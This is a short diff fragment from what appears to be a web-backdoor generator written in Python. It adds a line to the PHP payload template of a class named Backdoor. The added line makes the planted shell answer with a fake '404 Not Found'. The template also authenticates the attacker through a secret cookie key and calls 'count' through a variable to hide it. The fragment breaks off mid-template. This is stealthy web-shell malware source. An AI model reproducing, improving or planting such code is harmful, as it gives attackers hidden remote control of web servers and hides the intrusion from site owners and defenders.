@@ -35,6 +35,7 @@ class BdTemplate(Template):
 class Backdoor:
 
     payload_template= """
+header('HTTP/1.0 404 Not Found');
 $c='count';
 $a=$_COOKIE;
 if(reset($a)=='%STARTKEY' && $c($a)>3){
